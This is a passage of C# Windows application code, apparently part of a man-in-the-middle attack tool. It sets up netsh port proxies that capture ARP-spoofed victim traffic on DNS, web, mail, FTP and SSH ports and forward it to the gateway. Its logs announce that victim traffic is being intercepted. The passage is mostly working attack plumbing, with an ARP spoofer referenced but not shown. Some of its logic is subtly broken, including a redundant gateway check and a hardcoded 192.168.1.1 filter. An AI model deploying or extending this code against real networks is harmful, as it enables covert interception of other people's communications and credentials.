                var gatewayIP = await GetGatewayIP();
                var attackerIP = txtAttackerIP.Text.Trim();

                if (string.IsNullOrEmpty(gatewayIP))
                {
                    AppendPortForwardingLog("❌ Cannot detect gateway IP");
                    return;
                }

                if (string.IsNullOrEmpty(attackerIP))
                {
                    attackerIP = await GetLocalIPAddress();
                    txtAttackerIP.Text = attackerIP;
                }

                AppendPortForwardingLog($"📋 Current Configuration:");
                AppendPortForwardingLog($"   🛣️ Gateway: {gatewayIP}");
                AppendPortForwardingLog($"   🎯 Attacker: {attackerIP}");

                // Check if IP forwarding is enabled
                var forwardingEnabled = await CheckIPForwardingStatus();
                AppendPortForwardingLog($"   📡 IP Forwarding: {(forwardingEnabled ? "✅ Enabled" : "❌ Disabled")}");

                // Check active port proxies
                var activeProxies = await GetActivePortProxies();
                AppendPortForwardingLog($"   🔄 Active Proxies: {activeProxies}");

                // Check if ARP spoofing is currently active
                var arpSpoofingActive = _arpSpoofer?.IsActive ?? false;
                AppendPortForwardingLog($"   🕷️ ARP Spoofing Status: {(arpSpoofingActive ? "🟠 ACTIVE" : "⚪ Inactive")}");

                // Test connectivity to gateway
                var pingResult = await TestPingConnectivity(gatewayIP);
                AppendPortForwardingLog($"   🏓 Gateway Ping: {(pingResult ? "✅ Success" : "❌ Failed")}");

                // If ARP spoofing is active, ping failures are expected and not critical
                if (arpSpoofingActive && !pingResult)
                {
                    AppendPortForwardingLog("   ⚠️ Ping failure expected during ARP spoofing attack - this is normal!");
                    AppendPortForwardingLog("   🔍 ARP spoofing may disrupt attacker's direct network connectivity");
                }

                // Adjust success criteria: ping not required if ARP spoofing is active
                var networkOk = pingResult || arpSpoofingActive;

                if (forwardingEnabled && activeProxies > 0 && networkOk)
                {
                    if (arpSpoofingActive)
                    {
                        AppendPortForwardingLog("✅ TRANSPARENT PROXY OPERATIONAL during ARP spoofing attack!");
                        AppendPortForwardingLog("🎯 Attack Configuration Status:");
                        AppendPortForwardingLog("   1. ✅ IP Forwarding enabled (Windows gateway mode)");
                        AppendPortForwardingLog("   2. ✅ Port proxies configured (listening 0.0.0.0)");
                        AppendPortForwardingLog("   3. 🟠 ARP spoofing active - network disruption expected");
                        AppendPortForwardingLog("🕷️ MITM attack in progress - victim traffic being intercepted!");
                    }
                    else
                    {
                        AppendPortForwardingLog("✅ TRANSPARENT PROXY READY for ARP spoofing!");
                        AppendPortForwardingLog("🎯 Configuration Summary:");
                        AppendPortForwardingLog("   1. ✅ IP Forwarding enabled (Windows gateway mode)");
                        AppendPortForwardingLog("   2. ✅ Port proxies configured (listening 0.0.0.0)");
                        AppendPortForwardingLog("   3. ✅ Gateway connectivity verified");
                        AppendPortForwardingLog("🚀 Ready for ARP spoofing attack - victim should maintain internet access!");
                    }
                }
                else
                {
                    AppendPortForwardingLog("⚠️ CONFIGURATION INCOMPLETE:");
                    if (!forwardingEnabled) AppendPortForwardingLog("   ❌ Enable IP forwarding first");
                    if (activeProxies == 0) AppendPortForwardingLog("   ❌ Configure web traffic routing first");
                    if (!networkOk && !arpSpoofingActive) AppendPortForwardingLog("   ❌ Check network connectivity to gateway");
                }
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error testing proxy configuration: {ex.Message}");
            }
        }

        private async Task<bool> TestPingConnectivity(string targetIP)
        {
            try
            {
                AppendPortForwardingLog($"🏓 Testing ping to {targetIP}...");
                using var ping = new System.Net.NetworkInformation.Ping();
                var reply = await ping.SendPingAsync(targetIP, 3000);

                AppendPortForwardingLog($"   📊 Ping Status: {reply.Status}");
                AppendPortForwardingLog($"   ⏱️ Response Time: {reply.RoundtripTime}ms");

                var success = reply.Status == System.Net.NetworkInformation.IPStatus.Success;
                AppendPortForwardingLog($"   {(success ? "✅" : "❌")} Ping Result: {(success ? "SUCCESS" : "FAILED")}");

                return success;
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"   ❌ Ping Exception: {ex.Message}");
                return false;
            }
        }

        private async void BtnRestoreNormal_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                AppendPortForwardingLog("🔄 Restoring normal network mode...");

                // Reset all port proxies
                var resetResult = await ExecuteNetshCommand("netsh interface portproxy reset", "Reset all port proxies");

                // Disable IP forwarding (corrected command)
                var disableResult = await ExecuteNetshCommand("netsh interface ipv4 set global sourceroutingbehavior=dontforward", "Disable IP forwarding");

                if (resetResult && disableResult)
                {
                    txtIPForwardingStatus.Text = "Disabled";
                    txtIPForwardingStatus.Foreground = new System.Windows.Media.SolidColorBrush(System.Windows.Media.Colors.Orange);
                    txtActiveProxies.Text = "0";
                    AppendPortForwardingLog("✅ Network restored to normal mode successfully");
                    AppendPortForwardingLog("📋 All port proxies removed, IP forwarding disabled");
                }
                else
                {
                    AppendPortForwardingLog("⚠️ Some operations failed during restore - check logs");
                }
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error restoring normal mode: {ex.Message}");
            }
        }

        private async void BtnRouteWebTraffic_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var targetIP = txtTargetIP.Text.Trim();
                if (string.IsNullOrEmpty(targetIP))
                {
                    AppendPortForwardingLog("❌ Please specify Target IP first");
                    return;
                }

                AppendPortForwardingLog("🌐 Setting up web traffic routing...");
                AppendPortForwardingLog($"🎯 Routing victim {targetIP} web traffic → Gateway");
                AppendPortForwardingLog($"ℹ️ This allows victim to browse internet while traffic is intercepted");

                // Get gateway IP for real web traffic forwarding
                var gatewayIP = await GetGatewayIP();
                if (string.IsNullOrEmpty(gatewayIP))
                {
                    AppendPortForwardingLog("❌ Could not detect gateway IP");
                    return;
                }

                AppendPortForwardingLog($"🛣️ Gateway detected: {gatewayIP}");

                // APPROCHE CORRIGÉE: Proxy transparent sur IP du GATEWAY pour ARP spoofing
                var attackerIP = txtAttackerIP.Text.Trim();
                if (string.IsNullOrEmpty(attackerIP))
                {
                    attackerIP = await GetLocalIPAddress();
                    txtAttackerIP.Text = attackerIP;
                }

                AppendPortForwardingLog($"🔄 Setting up ARP spoofing transparent proxy...");
                AppendPortForwardingLog($"📡 ARP spoofing: Victim thinks gateway {gatewayIP} = attacker MAC");
                AppendPortForwardingLog($"🌐 Proxy: Listen on gateway IP {gatewayIP}, forward to real gateway");
                AppendPortForwardingLog($"⚠️ This requires attacker machine to respond for gateway IP");

                // Route essential internet ports FROM gateway IP TO real gateway (ARP spoofing mode)
                var webPorts = new[] { "53", "80", "443", "8080", "8443", "853", "21", "22", "25", "110", "143", "993", "995" };
                var successCount = 0;

                foreach (var port in webPorts)
                {
                    // Listen on any interface to catch ARP spoofed traffic and forward to real gateway
                    var command = $"netsh interface portproxy add v4tov4 listenport={port} listenaddress=0.0.0.0 connectport={port} connectaddress={gatewayIP}";
                    var result = await ExecuteNetshCommand(command, $"Proxy any interface port {port}");
                    if (result) successCount++;
                }

                AppendPortForwardingLog($"🔧 Using 0.0.0.0 listen address to catch all ARP spoofed traffic");

                // Refresh status
                var activeProxies = await GetActivePortProxies();
                txtActiveProxies.Text = activeProxies.ToString();

                AppendPortForwardingLog($"✅ Transparent proxy configured: {successCount}/{webPorts.Length} ports");
                AppendPortForwardingLog($"📡 ARP spoofed victim traffic → attacker {attackerIP} → gateway {gatewayIP}");
                AppendPortForwardingLog($"🌐 Ports proxied: DNS(53,853), HTTP(80,8080), HTTPS(443,8443), Mail(25,110,143,993,995), FTP(21), SSH(22)");
                AppendPortForwardingLog($"🎯 Victim should now have complete internet access via transparent proxy!");
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error setting up web routing: {ex.Message}");
            }
        }

        private async void BtnRemoveWebRouting_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                var attackerIP = txtAttackerIP.Text.Trim();
                if (string.IsNullOrEmpty(attackerIP))
                {
                    attackerIP = await GetLocalIPAddress();
                    txtAttackerIP.Text = attackerIP;
                }

                AppendPortForwardingLog("🚫 Removing transparent proxy routing...");
                AppendPortForwardingLog($"🎯 Removing proxy rules from all interfaces (0.0.0.0)");

                // Remove essential internet ports from all interfaces
                var webPorts = new[] { "53", "80", "443", "8080", "8443", "853", "21", "22", "25", "110", "143", "993", "995" };
                var successCount = 0;

                foreach (var port in webPorts)
                {
                    var command = $"netsh interface portproxy delete v4tov4 listenport={port} listenaddress=0.0.0.0";
                    var result = await ExecuteNetshCommand(command, $"Remove proxy port {port}");
                    if (result) successCount++;
                }

                // Refresh status
                var activeProxies = await GetActivePortProxies();
                txtActiveProxies.Text = activeProxies.ToString();

                AppendPortForwardingLog($"✅ Transparent proxy removed: {successCount}/{webPorts.Length} ports");
                AppendPortForwardingLog($"🚫 Victim will no longer have internet access via proxy");
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error removing web routing: {ex.Message}");
            }
        }

        // Port Forwarding Helper Methods
        private async Task<bool> CheckIPForwardingStatus()
        {
            try
            {
                using var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = "interface ipv4 show global";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                var output = await process.StandardOutput.ReadToEndAsync();
                await process.WaitForExitAsync();

                // Check for source routing behavior = forward
                return output.Contains("Source Routing Behavior") && output.Contains("forward");
            }
            catch
            {
                return false;
            }
        }

        private async Task<int> GetActivePortProxies()
        {
            try
            {
                using var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = "interface portproxy show all";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                var output = await process.StandardOutput.ReadToEndAsync();
                await process.WaitForExitAsync();

                AppendPortForwardingLog($"🔍 DEBUG - Raw portproxy output:");
                AppendPortForwardingLog($"   📄 Output length: {output.Length} chars");
                if (!string.IsNullOrEmpty(output))
                {
                    var lines = output.Split('\n', StringSplitOptions.RemoveEmptyEntries);
                    AppendPortForwardingLog($"   📋 Total lines: {lines.Length}");

                    // Show ALL lines to debug parsing issue
                    for (int i = 0; i < Math.Min(15, lines.Length); i++)
                    {
                        AppendPortForwardingLog($"   Line {i}: '{lines[i].Trim()}'");
                    }
                }
                else
                {
                    AppendPortForwardingLog($"   ⚠️ Output is empty!");
                }

                // Count lines that contain proxy entries - FIX PARSING LOGIC
                var lines2 = output.Split('\n', StringSplitOptions.RemoveEmptyEntries);
                var proxyLines = lines2.Where(line =>
                    !string.IsNullOrWhiteSpace(line) &&
                    !line.Contains("Listen on ipv4") &&
                    !line.Contains("Address") &&
                    !line.Contains("-----") &&
                    line.Contains("0.0.0.0") &&
                    line.Contains("192.168.1.1")).ToArray();

                AppendPortForwardingLog($"   🎯 Proxy lines found: {proxyLines.Length}");
                foreach (var proxy in proxyLines.Take(3))
                {
                    AppendPortForwardingLog($"      ↔️ {proxy.Trim()}");
                }

                return proxyLines.Length;
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error getting active proxies: {ex.Message}");
                return 0;
            }
        }

        private async Task<bool> ExecuteNetshCommand(string command, string description)
        {
            try
            {
                AppendPortForwardingLog($"🔧 Executing: {description}");
                AppendPortForwardingLog($"   Command: {command}");

                using var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = $"/c {command}";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.RedirectStandardError = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                var output = await process.StandardOutput.ReadToEndAsync();
                var error = await process.StandardError.ReadToEndAsync();
                await process.WaitForExitAsync();

                if (!string.IsNullOrEmpty(output.Trim()))
                {
                    AppendPortForwardingLog($"   Output: {output.Trim()}");
                }

                if (!string.IsNullOrEmpty(error.Trim()))
                {
                    AppendPortForwardingLog($"   Error: {error.Trim()}");
                    return false;
                }

                return process.ExitCode == 0;
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"   Exception: {ex.Message}");
                return false;
            }
        }

        private void AppendPortForwardingLog(string message)
        {
            Dispatcher.BeginInvoke(() =>
            {
                var timestamp = DateTime.Now.ToString("HH:mm:ss.fff");
                txtPortForwardingLog.AppendText($"[{timestamp}] {message}\n");
                txtPortForwardingLog.ScrollToEnd();
            });

            // Also append to global log
            AppendLog($"[PORT-FWD] {message}");
        }

        private async void BtnDetectAttackerIP_Click(object sender, RoutedEventArgs e)
        {
            try
            {
                AppendPortForwardingLog("🔍 Detecting attacker machine IP...");
                await AutoDetectAttackerIP();
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error detecting attacker IP: {ex.Message}");
            }
        }

        private async Task AutoDetectAttackerIP()
        {
            try
            {
                var attackerIP = await GetLocalIPAddress();
                if (!string.IsNullOrEmpty(attackerIP))
                {
                    // Update UI on main thread
                    Dispatcher.BeginInvoke(() =>
                    {
                        txtAttackerIP.Text = attackerIP;
                    });

                    AppendPortForwardingLog($"✅ Attacker IP detected: {attackerIP}");
                }
                else
                {
                    AppendPortForwardingLog("❌ Could not detect local IP address");
                }
            }
            catch (Exception ex)
            {
                AppendPortForwardingLog($"❌ Error auto-detecting IP: {ex.Message}");
            }
        }

        private async Task<string> GetLocalIPAddress()
        {
            try
            {
                using var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c ipconfig";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                var output = await process.StandardOutput.ReadToEndAsync();
                await process.WaitForExitAsync();

                // Parse output to find IPv4 address (not localhost)
                var lines = output.Split('\n');
                foreach (var line in lines)
                {
                    if (line.Trim().StartsWith("IPv4") && line.Contains(":"))
                    {
                        var ipPart = line.Substring(line.IndexOf(':') + 1).Trim();
                        // Remove any additional text after the IP
                        var ip = ipPart.Split(' ')[0].Trim();

                        if (System.Net.IPAddress.TryParse(ip, out var ipAddress))
                        {
                            // Skip localhost and APIPA addresses
                            if (!System.Net.IPAddress.IsLoopback(ipAddress) &&
                                !ip.StartsWith("169.254.") &&
                                !ip.StartsWith("127."))
                            {
                                return ip;
                            }
                        }
                    }
                }

                return "";
            }
            catch
            {
                return "";
            }
        }

        private async Task<string> GetGatewayIP()
        {
            try
            {
                using var process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c route print 0.0.0.0";
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.CreateNoWindow = true;

                process.Start();
                var output = await process.StandardOutput.ReadToEndAsync();
                await process.WaitForExitAsync();

                // Parse output to find default gateway
                var lines = output.Split('\n');
                foreach (var line in lines)
                {
                    if (line.Contains("0.0.0.0") && line.Contains("0.0.0.0"))
                    {
                        var parts = line.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);
                        if (parts.Length >= 3)
                        {
                            // Gateway IP is typically the 3rd column
                            var gatewayIP = parts[2];
                            if (System.Net.IPAddress.TryParse(gatewayIP, out _))
                            {
                                return gatewayIP;
                            }
                        }
                    }
                }

                return "";
            }
            catch
            {
                return "";
            }
        }
        private bool CheckAdminPrivileges()
        {
            try
            {
                var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
                var principal = new System.Security.Principal.WindowsPrincipal(identity);
                return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
            }
            catch
            {
                return false;
            }
        }
    }
}
